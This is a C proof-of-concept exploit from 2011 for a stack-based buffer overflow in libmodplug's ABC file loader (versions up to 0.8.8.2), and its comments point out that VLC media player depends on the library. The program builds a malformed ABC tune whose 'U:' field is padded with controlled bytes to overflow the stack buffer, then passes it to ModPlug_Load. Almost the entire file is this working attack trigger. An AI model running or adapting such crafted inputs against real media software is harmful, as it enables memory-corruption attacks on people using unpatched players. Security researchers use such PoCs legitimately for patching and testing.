#include <libmodplug/modplug.h>
#include <stdio.h>
#include <string.h>
 
/*
libmodplug <= 0.8.8.2 .abc stack-based buffer overflow poc
 
http://modplug-xmms.sourceforge.net/
 
by: epiphant
 
this exploits one of many overflows in load_abc.cpp lol
 
vlc media player uses libmodplug
 
greets: defrost, babi, ming_wisher, emel1a, a.v., krs
 
date: 28 april 2011
 
tested on: centos 5.6
*/
 
int main(void)
{
  char test[512] = "X: 1\nU: ";
  unsigned int i;
 
  i = strlen(test);
  while (i < 278)
    test[i++] = 'Q';
  test[i++] = '1' + 32;
  test[i++] = '3';
  test[i++] = '3';
  test[i++] = '4';
  while (i < 286)
    test[i++] = 'A';
  test[i++] = '\n';
  test[i] = '\0';
 
  strcat(test, "T: Here Without You (Transcribed by: Bungee)\n");
  strcat(test, "Z: 3 Doors Down\n");
  strcat(test, "L: 1/4\n");
  strcat(test, "Q: 108\n");
  strcat(test, "K: C\n\n");
  strcat(test, "[A,3A3/4] [E9/8z3/8] A3/8 [c9/8z3/8] [A9/8z3/8] [E3/4z3/8]\n");
 
  i = strlen(test);
  ModPlug_Load(test, i);
 
  return 0;
}